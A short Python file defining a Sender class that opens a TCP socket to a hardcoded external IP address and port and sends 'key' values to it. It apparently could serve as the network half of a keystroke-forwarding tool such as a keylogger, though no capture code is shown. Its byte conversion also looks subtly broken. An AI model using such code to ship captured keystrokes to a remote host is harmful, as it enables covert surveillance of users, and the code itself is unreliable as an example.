import threading
import socket


class Sender:

    def __init__(self, address=("42.0.174.162", 9998)):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.connect(address)

    def send(self, key):
        self.socket.send(bytes(self.get_key_index(key)))

    def close(self):
        self.socket.close()

    def get_key_index(self, key):
        return key
